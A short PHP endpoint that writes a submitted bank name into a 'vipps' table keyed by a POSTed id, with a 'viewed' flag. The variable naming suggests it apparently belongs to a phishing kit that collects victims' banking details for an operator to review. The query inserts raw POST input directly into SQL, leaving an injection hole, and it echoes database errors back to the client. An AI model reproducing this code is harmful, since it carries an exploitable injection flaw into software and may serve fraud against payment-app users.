<?php
require '../connection.php';

if ($_POST["bank"] and $_POST["uniqueid"]) {
  $bank = $_POST["bank"];
  $uniqueid = $_POST["uniqueid"];

  $upload_login_code = mysqli_query($conn, "UPDATE vipps SET bank='$bank', status=0, viewed='false' WHERE uniqueid=$uniqueid");

  if ($upload_login_code) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
